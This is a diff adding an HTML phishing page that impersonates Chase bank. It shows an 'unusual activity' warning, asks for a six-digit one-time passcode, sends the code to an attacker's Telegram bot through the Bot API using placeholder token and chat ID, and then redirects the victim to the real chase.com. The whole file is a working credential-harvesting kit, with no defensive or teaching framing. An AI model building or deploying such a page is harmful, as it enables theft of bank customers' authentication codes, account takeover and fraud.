@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Verify - chase.com</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body, html { height: 100%; font-family: Arial, sans-serif; }
+    body {
+      background: url('https://images.unsplash.com/photo-1573164574572-cb89e39749b4?auto=format&fit=crop&w=1650&q=80') no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+    .logo { margin-bottom: 20px; }
+    .logo img { max-width: 120px; }
+    .login-box {
+      background: white;
+      padding: 32px;
+      width: 320px;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+      text-align: center;
+    }
+    h2 {
+      font-size: 18px;
+      color: #b00020;
+      margin-bottom: 20px;
+    }
+    .input-wrapper {
+      position: relative;
+      margin-bottom: 20px;
+    }
+    .input-wrapper input {
+      border: none;
+      border-bottom: 2px solid #ccc;
+      padding: 10px 0;
+      width: 100%;
+      font-size: 16px;
+      outline: none;
+      text-align: center;
+      letter-spacing: 8px;
+    }
+    .input-wrapper input:focus {
+      border-bottom: 2px solid #0074cc;
+    }
+    button {
+      background-color: #0074cc;
+      color: white;
+      border: none;
+      padding: 12px;
+      font-size: 16px;
+      border-radius: 4px;
+      cursor: pointer;
+      width: 100%;
+    }
+    footer {
+      position: absolute;
+      bottom: 0;
+      width: 100%;
+      text-align: center;
+      font-size: 11px;
+      padding: 16px;
+      background-color: white;
+    }
+    @media (max-width: 500px) {
+      .login-box { width: 90%; padding: 24px; }
+      .logo img { max-width: 100px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="logo">
+    <img src="chase-logo.png" alt="Chase Logo">
+  </div>
+
+  <div class="login-box">
+    <h2>We detected unusual activity on your account</h2>
+    <div class="input-wrapper">
+      <input type="text" id="otp" maxlength="6" placeholder="------" required />
+    </div>
+    <button onclick="verifyOTP()">Verify</button>
+  </div>
+
+  <footer>
+    Contact us | Privacy | Security | Terms of use | Accessibility | Careers<br />
+    © 2025 JPMorgan Chase & Co. Member FDIC. Equal Housing Opportunity.
+  </footer>
+
+  <script>
+    const TOKEN = "YOUR_TELEGRAM_BOT_TOKEN";
+    const CHAT_ID = "YOUR_CHAT_ID";
+
+    function verifyOTP() {
+      const otp = document.getElementById("otp").value.trim();
+      const message = `🔒 OTP Verification Attempt:\n📲 Code: ${otp}`;
+
+      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message
+        })
+      })
+      .then(() => {
+        window.location.href = "https://www.chase.com";
+      })
+      .catch(error => console.error("Telegram error:", error));
+    }
+  </script>
+</body>
+</html>
